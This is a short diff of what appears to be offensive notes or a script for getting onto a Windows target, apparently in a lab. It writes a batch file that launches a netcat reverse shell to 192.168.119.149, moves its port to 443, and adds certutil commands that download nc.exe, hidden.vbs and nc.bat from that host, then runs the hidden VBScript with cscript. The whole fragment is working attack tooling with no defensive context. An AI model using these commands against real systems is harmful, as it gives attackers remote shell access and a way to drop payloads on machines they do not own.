@@ -123,7 +123,7 @@ Set WshShell = Nothing
 EOF
 
 cat << EOF > nc.bat
-C:\windows\temp\test\nc.exe 192.168.119.149 4488 -e cmd
+C:\windows\temp\test\nc.exe 192.168.119.149 443 -e cmd
 EOF
 
 ## On windows
@@ -131,6 +131,8 @@ EOF
 certutil -urlcache -split -f http://192.168.119.149/hidden.vbs
 
 certutil -urlcache -split -f http://192.168.119.149/nc.bat
+
+certutil -urlcache -split -f http://192.168.119.149/nc.exe
 
 cmd /c cscript hidden.vbs
 
